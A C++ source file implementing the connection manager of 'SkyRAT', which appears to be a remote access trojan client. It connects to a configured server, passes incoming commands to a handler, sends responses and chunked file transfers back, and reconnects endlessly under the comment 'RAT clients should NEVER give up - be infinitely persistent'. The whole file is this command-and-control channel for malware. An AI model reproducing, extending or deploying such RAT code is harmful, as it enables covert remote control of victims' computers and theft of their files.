#include "ConnectionManager.h"
#include "ConfigManager.h"
#include "../Utils/Logger.h"
#include "../Network/MessageProtocol.h"

#include <iostream>
#include <thread>
#include <chrono>
#include <sstream>
#include <map>
#include <cmath>
#include <algorithm>

namespace SkyRAT {
namespace Core {

    ConnectionManager::ConnectionManager(std::shared_ptr<ConfigManager> configManager,
                                       std::shared_ptr<Utils::Logger> logger)
        : m_configManager(configManager)
        , m_logger(logger)
        , m_messageProtocol(std::make_unique<Network::MessageProtocol>())
        , m_state(ConnectionState::Disconnected)
        , m_running(false)
        , m_shouldReconnect(false)
        , m_socket(INVALID_SOCKET)
        , m_reconnectAttempts(0) {
    }

    ConnectionManager::~ConnectionManager() {
        stop();
    }

    bool ConnectionManager::initialize() {
        if (!m_configManager || !m_logger) {
            std::cerr << "[ConnectionManager] Invalid dependencies" << std::endl;
            return false;
        }

        // Load configuration
        m_serverIP = m_configManager->getServerIP();
        m_serverPort = m_configManager->getServerPort();
        m_receiveBufferSize = m_configManager->getReceiveBufferSize();
        m_autoReconnect = m_configManager->getAutoReconnect();
        m_reconnectInterval = m_configManager->getValue<int>("reconnect_interval", 3000);
        m_maxReconnectAttempts = m_configManager->getValue<int>("max_reconnect_attempts", 10);

        m_logger->info("ConnectionManager initialized - Server: " + m_serverIP + ":" + std::to_string(m_serverPort));
        return initializeSocketSubsystem();
    }

    void ConnectionManager::start() {
        if (m_running.load()) {
            m_logger->warning("ConnectionManager already running");
            return;
        }

        m_logger->info("Starting ConnectionManager");
        m_running = true;
        m_shouldReconnect = true;
        
        // Reset statistics
        m_stats = ConnectionStats{};
        resetReconnectionState();

        // Start connection loop in a separate thread
        std::thread connectionThread(&ConnectionManager::connectionLoop, this);
        connectionThread.detach();
    }

    void ConnectionManager::stop() {
        if (!m_running.load()) {
            return;
        }

        m_logger->info("Stopping ConnectionManager");
        m_running = false;
        m_shouldReconnect = false;

        disconnectFromServer();
        cleanupSocketSubsystem();

        setState(ConnectionState::Disconnected);
    }

    ConnectionManager::ConnectionState ConnectionManager::getState() const {
        return m_state.load();
    }

    bool ConnectionManager::isConnected() const {
        return m_state.load() == ConnectionState::Connected;
    }

    void ConnectionManager::setMessageHandler(MessageHandler handler) {
        m_messageHandler = handler;
    }

    bool ConnectionManager::sendMessage(const std::string& message) {
        if (!isConnected()) {
            m_logger->warning("Cannot send message - not connected");
            return false;
        }

        return sendRawData(message.c_str(), static_cast<int>(message.length()));
    }

    bool ConnectionManager::sendFormattedMessage(const std::string& message) {
        if (!isConnected()) {
            m_logger->warning("Cannot send formatted message - not connected");
            return false;
        }

        std::vector<char> packet = m_messageProtocol->createTextMessage(message);
        bool success = sendRawData(packet.data(), static_cast<int>(packet.size()));
        
        if (success) {
            m_stats.messagesSent++;
            m_stats.bytesSent += packet.size();
            m_logger->debug("Sent formatted message: " + message);
        }
        
        return success;
    }

    bool ConnectionManager::sendStructuredMessage(const std::map<std::string, std::string>& data) {
        if (!isConnected()) {
            m_logger->warning("Cannot send structured message - not connected");
            return false;
        }

        std::vector<char> packet = m_messageProtocol->createStructuredMessage(data);
        bool success = sendRawData(packet.data(), static_cast<int>(packet.size()));
        
        if (success) {
            m_stats.messagesSent++;
            m_stats.bytesSent += packet.size();
            m_logger->debug("Sent structured message with " + std::to_string(data.size()) + " fields");
        }
        
        return success;
    }

    bool ConnectionManager::sendCommand(const std::string& command, const std::map<std::string, std::string>& args) {
        if (!isConnected()) {
            m_logger->warning("Cannot send command - not connected");
            return false;
        }

        std::vector<char> packet = m_messageProtocol->createCommandMessage(command, args);
        bool success = sendRawData(packet.data(), static_cast<int>(packet.size()));
        
        if (success) {
            m_stats.messagesSent++;
            m_stats.bytesSent += packet.size();
            m_logger->debug("Sent command: " + command);
        }
        
        return success;
    }

    bool ConnectionManager::sendResponse(const std::string& response, bool success) {
        if (!isConnected()) {
            m_logger->warning("Cannot send response - not connected");
            return false;
        }

        std::vector<char> packet = m_messageProtocol->createResponseMessage(response, success);
        bool sendSuccess = sendRawData(packet.data(), static_cast<int>(packet.size()));
        
        if (sendSuccess) {
            m_stats.messagesSent++;
            m_stats.bytesSent += packet.size();
            m_logger->debug("Sent response: " + std::string(success ? "SUCCESS" : "FAILURE"));
        }
        
        return sendSuccess;
    }

    bool ConnectionManager::sendError(const std::string& error, int errorCode) {
        if (!isConnected()) {
            m_logger->warning("Cannot send error - not connected");
            return false;
        }

        std::vector<char> packet = m_messageProtocol->createErrorMessage(error, errorCode);
        bool success = sendRawData(packet.data(), static_cast<int>(packet.size()));
        
        if (success) {
            m_stats.messagesSent++;
            m_stats.bytesSent += packet.size();
            m_logger->warning("Sent error message: " + error);
        }
        
        return success;
    }

    bool ConnectionManager::sendFile(const std::string& filename, const std::vector<char>& fileData) {
        if (!isConnected()) {
            m_logger->warning("Cannot send file - not connected");
            return false;
        }

        m_logger->info("Sending file: " + filename + " (" + std::to_string(fileData.size()) + " bytes)");
        
        // Create file transfer messages (may be chunked for large files)
        auto messages = m_messageProtocol->createFileTransferMessages(filename, fileData);
        
        bool allSuccess = true;
        size_t totalBytesSent = 0;
        
        for (size_t i = 0; i < messages.size(); ++i) {
            const auto& packet = messages[i];
            bool success = sendRawData(packet.data(), static_cast<int>(packet.size()));
            
            if (success) {
                totalBytesSent += packet.size();
                
                // Log progress for chunked transfers
                if (messages.size() > 1) {
                    m_logger->debug("Sent file chunk " + std::to_string(i + 1) + "/" + std::to_string(messages.size()));
                }
                
                // Small delay between chunks to avoid overwhelming the connection
                if (i < messages.size() - 1 && messages.size() > 1) {
                    std::this_thread::sleep_for(std::chrono::milliseconds(20));
                }
            } else {
                m_logger->error("Failed to send file chunk " + std::to_string(i + 1) + "/" + std::to_string(messages.size()));
                allSuccess = false;
                break;
            }
        }
        
        if (allSuccess) {
            m_stats.messagesSent += messages.size();
            m_stats.bytesSent += totalBytesSent;
            m_logger->info("File transfer completed successfully: " + filename);
        } else {
            m_logger->error("File transfer failed: " + filename);
        }
        
        return allSuccess;
    }

    ConnectionManager::ConnectionStats ConnectionManager::getStats() const {
        return m_stats;
    }

    bool ConnectionManager::initializeSocketSubsystem() {
        WSADATA wsaData;
        int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
        if (result != 0) {
            m_logger->error("WSAStartup failed with error: " + std::to_string(result));
            return false;
        }
        m_logger->debug("Windows socket subsystem initialized");
        return true;
    }

    void ConnectionManager::cleanupSocketSubsystem() {
        WSACleanup();
        m_logger->debug("Windows socket subsystem cleaned up");
    }

    SOCKET ConnectionManager::createAndConnectSocket() {
        // Create socket
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            m_logger->error("Could not create socket");
            m_logger->error("WSA Error: " + std::to_string(WSAGetLastError()));
            return INVALID_SOCKET;
        }

        // Set socket options for better performance
        DWORD timeout = m_configManager->getConnectionTimeout();
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

        // Setup server address
        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(m_serverPort);
        serverAddr.sin_addr.s_addr = inet_addr(m_serverIP.c_str());

        // Connect to server
        setState(ConnectionState::Connecting);
        m_logger->info("Attempting to connect to " + m_serverIP + ":" + std::to_string(m_serverPort));
        
        if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            m_logger->error("Connection failed");
            m_logger->error("WSA Error: " + std::to_string(WSAGetLastError()));
            closesocket(sock);
            return INVALID_SOCKET;
        }

        m_logger->info("Successfully connected to server");
        return sock;
    }

    void ConnectionManager::closeSocket() {
        if (m_socket != INVALID_SOCKET) {
            closesocket(m_socket);
            m_socket = INVALID_SOCKET;
        }
    }

    bool ConnectionManager::connectToServer() {
        SOCKET sock = createAndConnectSocket();
        if (sock == INVALID_SOCKET) {
            setState(ConnectionState::Failed);
            return false;
        }

        m_socket = sock;
        setState(ConnectionState::Connected);
        m_stats.connectedSince = std::chrono::steady_clock::now();
        resetReconnectionState();

        return sendInitialGreeting();
    }

    void ConnectionManager::disconnectFromServer() {
        if (m_socket != INVALID_SOCKET) {
            m_logger->info("Disconnecting from server");
            closeSocket();
            setState(ConnectionState::Disconnected);
        }
    }

    std::vector<char> ConnectionManager::createMessagePacket(const std::string& content) {
        // DEPRECATED: Use MessageProtocol::createTextMessage instead
        // Kept for backward compatibility - delegates to MessageProtocol
        m_logger->debug("Using deprecated createMessagePacket - consider using MessageProtocol directly");
        return m_messageProtocol->createTextMessage(content);
    }

    bool ConnectionManager::sendRawData(const void* data, int size) {
        if (m_socket == INVALID_SOCKET) {
            return false;
        }

        int sent = send(m_socket, static_cast<const char*>(data), size, 0);
        if (sent == SOCKET_ERROR) {
            m_logger->error("Send failed");
            m_logger->error("WSA Error: " + std::to_string(WSAGetLastError()));
            setState(ConnectionState::Failed);
            return false;
        }

        return sent == size;
    }

    int ConnectionManager::receiveData(char* buffer, int bufferSize) {
        if (m_socket == INVALID_SOCKET) {
            return -1;
        }

        int received = recv(m_socket, buffer, bufferSize - 1, 0);
        if (received > 0) {
            buffer[received] = '\0'; // Null-terminate
            m_stats.messagesReceived++;
            m_stats.bytesReceived += received;
        } else if (received == 0) {
            // Server closed connection - but we'll try to reconnect
            m_logger->warning("Server closed the connection - will attempt to reconnect");
            setState(ConnectionState::Failed); // This will trigger reconnection
        } else {
            // Receive error - check if it's recoverable
            int wsaError = WSAGetLastError();
            if (wsaError == WSAEWOULDBLOCK || wsaError == WSAEINTR) {
                // Non-blocking socket would block or interrupted - not an error
                return 0;
            } else if (wsaError == WSAECONNRESET || wsaError == WSAECONNABORTED || wsaError == WSAENETDOWN) {
                // Connection lost - will reconnect
                m_logger->warning("Connection lost (WSA: " + std::to_string(wsaError) + ") - will reconnect");
                setState(ConnectionState::Failed);
            } else {
                // Other errors - log but don't immediately fail
                m_logger->warning("Receive error (WSA: " + std::to_string(wsaError) + ") - continuing");
            }
        }

        return received;
    }

    void ConnectionManager::connectionLoop() {
        m_logger->info("Connection loop started");

        while (m_running.load()) {
            if (!isConnected()) {
                if (m_shouldReconnect.load()) {
                    if (!connectToServer()) {
                        attemptReconnection();
                        continue;
                    }
                } else {
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    continue;
                }
            }

            handleIncomingMessages();
            
            if (getState() == ConnectionState::Failed && m_autoReconnect) {
                attemptReconnection();
            }
        }

        m_logger->info("Connection loop finished");
    }

    bool ConnectionManager::sendInitialGreeting() {
        std::string greeting = "Hello from SkyRAT client!";
        if (!sendFormattedMessage(greeting)) {
            m_logger->error("Failed to send initial greeting");
            return false;
        }
        
        m_logger->info("Initial greeting sent to server");
        return true;
    }

    void ConnectionManager::handleIncomingMessages() {
        std::vector<char> buffer(m_receiveBufferSize);
        
        // Use non-blocking approach with select
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(m_socket, &readSet);
        
        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 50000; // 50ms timeout - shorter for more responsiveness
        
        int selectResult = select(0, &readSet, nullptr, nullptr, &timeout);
        
        if (selectResult > 0 && FD_ISSET(m_socket, &readSet)) {
            // Data is available to read
            int received = receiveData(buffer.data(), static_cast<int>(buffer.size()));
            
            if (received > 0) {
                std::string message(buffer.data());
                m_logger->debug("Received message: " + message);
                
                if (m_messageHandler) {
                    try {
                        m_messageHandler(message, m_socket);
                    } catch (const std::exception& e) {
                        m_logger->error("Exception in message handler: " + std::string(e.what()));
                        // Don't disconnect on handler errors - just continue
                    }
                }
                
                // Send acknowledgment - but don't fail if it doesn't work
                std::string ack = "ACK: " + message;
                if (!sendFormattedMessage(ack)) {
                    m_logger->warning("Failed to send acknowledgment - continuing anyway");
                }
            }
        } else if (selectResult == 0) {
            // Timeout - this is normal, just continue
            return;
        } else {
            // Error in select - but don't immediately fail
            int wsaError = WSAGetLastError();
            if (wsaError == WSAECONNRESET || wsaError == WSAECONNABORTED || wsaError == WSAENETDOWN) {
                m_logger->warning("Connection lost in select - will reconnect");
                setState(ConnectionState::Failed);
            } else {
                // Other select errors - just log and continue
                m_logger->debug("Select returned error: " + std::to_string(wsaError) + " - continuing");
            }
        }
    }

    void ConnectionManager::attemptReconnection() {
        // RAT clients should NEVER give up - be infinitely persistent
        setState(ConnectionState::Reconnecting);
        m_reconnectAttempts++;
        m_stats.reconnectAttempts = m_reconnectAttempts.load();
        
        // Reset attempt counter periodically to avoid overflow and show we're still trying
        if (m_reconnectAttempts.load() > 1000) {
            m_logger->info("Resetting reconnection counter after 1000 attempts");
            m_reconnectAttempts = 1;
        }
        
        m_logger->info("Reconnection attempt " + std::to_string(m_reconnectAttempts.load()));

        disconnectFromServer();
        
        // Use exponential backoff but cap at reasonable maximum (30 seconds)
        int backoffMs = std::min(m_reconnectInterval * (int)std::pow(2, std::min(5, (int)m_reconnectAttempts.load())), 30000);
        std::this_thread::sleep_for(std::chrono::milliseconds(backoffMs));
        
        // Always enable reconnection - we never give up
        m_shouldReconnect = true;
    }

    void ConnectionManager::resetReconnectionState() {
        m_reconnectAttempts = 0;
        m_stats.reconnectAttempts = 0;
    }

    void ConnectionManager::setState(ConnectionState newState) {
        ConnectionState oldState = m_state.exchange(newState);
        if (oldState != newState) {
            m_logger->info("Connection state changed: " + stateToString(oldState) + 
                          " -> " + stateToString(newState));
        }
    }

    std::string ConnectionManager::stateToString(ConnectionState state) const {
        switch (state) {
            case ConnectionState::Disconnected: return "Disconnected";
            case ConnectionState::Connecting:   return "Connecting";
            case ConnectionState::Connected:    return "Connected";
            case ConnectionState::Reconnecting: return "Reconnecting";
            case ConnectionState::Failed:       return "Failed";
            default:                           return "Unknown";
        }
    }

} // namespace Core
} // namespace SkyRAT